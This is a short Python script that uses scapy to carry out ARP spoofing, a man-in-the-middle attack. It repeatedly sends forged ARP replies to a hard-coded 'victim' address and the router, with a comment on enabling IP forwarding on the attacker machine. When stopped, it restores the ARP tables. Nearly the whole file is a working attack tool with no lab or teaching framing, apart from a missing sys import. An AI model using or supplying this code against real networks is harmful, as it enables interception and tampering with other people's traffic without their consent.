#!usr/bin/env python3

import scapy.all as scapy
import time

# Functionality like arpspoof tool
# On the attacker machine, enables IP forwarding by running from command line $echo 1 > /proc/sys/net/ipv4/ip_forward

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    except Exception as e:
        print(f"[ERROR] Failed to scan network: {e}")
        sys.exit(1)

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.1.1.4" # victim
gateway_ip = "10.1.1.1" # router

print("Start spoofing (man-in-the-middle) between victim=" + str(target_ip) + " and router=" + str(gateway_ip))
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print ("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2) # sleep for 2 seconds
except KeyboardInterrupt:
    print("\nDetected CTRL+C. Resetting ARP tables. Please wait..")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("Restored.")
